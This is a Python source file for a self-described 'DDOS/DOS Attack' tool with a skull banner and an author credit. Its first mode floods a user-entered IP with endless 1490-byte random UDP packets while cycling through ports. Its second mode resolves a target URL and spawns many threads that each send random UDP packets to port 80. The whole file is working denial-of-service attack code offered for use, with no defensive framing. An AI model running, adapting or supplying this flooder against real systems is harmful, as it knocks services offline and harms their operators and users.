import socket, random, threading

Black = "\033[1;30m"
Red = "\033[1;31m"
Green = "\033[1;32m"
Yellow = "\033[1;33m"
Blue = "\033[1;34m"
Purple = "\033[1;35m"
Cyan = "\033[1;36m"
White = "\033[1;37m"
Gray = "\033[1;39m"
DarkRed = "\033[2;31m"
DarkBlue = "\033[2;34m"
DarkPink = "\033[2;35m"
DarkCyan = "\033[2;36m"

print("""\033[1;31m
                    ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶
                 ¶¶¶¶¶¶             ¶¶¶¶¶¶¶
              ¶¶¶¶                       ¶¶¶¶
             ¶¶¶                             ¶¶
            ¶¶                                ¶¶
           ¶¶                                 ¶¶
          ¶¶                                   ¶¶
          ¶¶ ¶¶                             ¶¶ ¶¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶ ¶¶                             ¶¶  ¶
          ¶¶  ¶¶                            ¶¶ ¶¶
          ¶¶  ¶¶                           ¶¶  ¶¶
           ¶¶ ¶¶   ¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶   ¶¶ ¶¶
            ¶¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶¶¶
             ¶¶¶ ¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶ ¶¶¶
    ¶¶¶      ¶¶  ¶¶¶¶¶¶¶¶        ¶¶¶¶¶¶¶¶¶  ¶¶      ¶¶¶¶
   ¶¶¶¶¶     ¶¶  ¶¶¶¶¶¶¶    ¶¶¶   ¶¶¶¶¶¶¶   ¶¶     ¶¶¶¶¶¶
  ¶¶   ¶¶   ¶¶     ¶¶¶     ¶¶¶¶¶    ¶¶¶     ¶¶    ¶¶   ¶¶
 ¶¶¶    ¶¶¶¶  ¶¶          ¶¶¶¶¶¶¶          ¶¶ ¶¶¶¶    ¶¶¶
 ¶¶         ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶       ¶¶¶¶¶¶¶¶¶        ¶¶
¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶    ¶¶¶¶¶¶¶¶      ¶¶¶¶¶¶¶¶
  ¶¶¶¶ ¶¶¶¶¶      ¶¶¶¶¶              ¶¶¶ ¶¶     ¶¶¶¶¶¶ ¶¶¶
          ¶¶¶¶¶¶ ¶¶¶  ¶¶           ¶¶ ¶¶¶ ¶¶¶¶¶¶
              ¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶¶¶¶¶¶ ¶¶ ¶¶¶¶¶¶
                  ¶¶ ¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶¶
                ¶¶¶¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶ ¶   ¶¶¶¶¶
            ¶¶¶¶¶ ¶¶   ¶¶¶¶¶¶¶¶¶¶¶¶¶   ¶¶ ¶¶¶¶¶
    ¶¶¶¶¶¶¶¶¶¶     ¶¶                 ¶¶      ¶¶¶¶¶¶¶¶¶
   ¶¶           ¶¶¶¶¶¶¶             ¶¶¶¶¶¶¶¶          ¶¶
    ¶¶¶     ¶¶¶¶¶     ¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶     ¶¶¶¶¶     ¶¶¶
      ¶¶   ¶¶¶           ¶¶¶¶¶¶¶¶¶           ¶¶¶   ¶¶
      ¶¶  ¶¶                                   ¶¶  ¶¶
       ¶¶¶¶                                     ¶¶¶¶

                          \033[1;37mv0.1.0
                      DDOS/DOS Attack

THIS TOOL WAS PROGRAMMED BY TLER AL-SHAHRANI.
PERSONAL WEBSITE : \033[1;34mhttps://tlersa.github.io/tleralshahrani/Index.html""")
print("\033[1;37m- "*35)

def main_menu():
    print("""\033[1;37m[\033[1;31m1\033[1;37m] - DDOS
[\033[1;31m2\033[1;37m] - DOS
[\033[1;31m99\033[1;37m] - Exit""")

def handle_selection(selection):
    if selection == "1"  or selection == "DDOS" or selection == "ddos":
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(1490)

        ip = input("[\033[1;31m+\033[1;37m] Enter the target IP : \033[1;31m")
        port = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the Port : \033[1;31m"))

        sent = 0

        while True:
            sock.sendto(bytes, (ip, port))
            sent = sent + 1
            port = port + 1
            print(f"\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{sent}\033[1;37m!")

            if port == 65534: port = 1

        another_operation = input("\033[1;37mWould you like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
        if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
        elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
        else:
            print("\033[1;31mPlease choose a valid option!\033[1;37m")
            exit()
            
    if selection == "2"  or selection == "DOS" or selection == "dos":
        def create_rnd_msg(msg_size):
            rnd_msg = ""
            for i in range(0, msg_size):
                ch_rnd = random.randint(0, 255)
                rnd_msg += chr(ch_rnd)
            return rnd_msg

        url = input("[\033[1;31m+\033[1;37m] Enter the target URL : \033[1;31m")
        if "https://" in url: url = url.split("https://")[1]
        if "/" in url: url = url.split("/")[0]

        thread_count = int(input("\033[1;37m[\033[1;31m+\033[1;37m] Enter the num of requests on the target server : \033[1;31m"))
        ip = socket.gethostbyname(url)

        UDP_PORT = 80

        print(f"""
\033[1;37m[\033[1;32m-\033[1;37m] Target URL : \033[1;31m{url}
\033[1;37m[\033[1;32m-\033[1;37m] Target IP : \033[1;31m{ip}
\033[1;37m[\033[1;32m-\033[1;37m] Protocol : \033[1;31mUDP
\033[1;37m[\033[1;32m-\033[1;37m] Target port : \033[1;31m{UDP_PORT}\n""")

        i = 0

        def dos():
            MESSAGE = str.encode(create_rnd_msg(8))
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(MESSAGE, (ip, UDP_PORT))

            print(f"\r\033[1;37m[\033[1;32m✓\033[1;37m] Sent successfuly \033[1;32m{i}\033[1;37m!", end="")

        thread_count = thread_count + 1
        
        try: 
            for i in range(thread_count): threading.Thread(target=dos).start()	
        finally:
            another_operation = input("\n\033[1;37mWould you like another operation? (\033[1;34mY\033[1;37m/\033[1;34mN\033[1;37m) \033[1;34m")
            if another_operation == "Y" or another_operation == "y" or another_operation == "Yes" or another_operation == "yes" or another_operation == "YES": main_menu()
            elif another_operation == "N" or another_operation == "n" or another_operation == "No" or another_operation == "no" or another_operation == "No": exit("\033[1;37m")
            else:
                print("\033[1;31mPlease choose a valid option!\033[1;37m")
                exit()

    elif selection == "99" or selection == "EXIT" or selection == "exit": exit()
    else: print("\033[1;31mPlease choose a valid option!")

def main():
    main_menu()

    while True:
        user_input = input("\033[1;37mChoose : ")
        handle_selection(user_input)

if __name__ == "__main__": main()
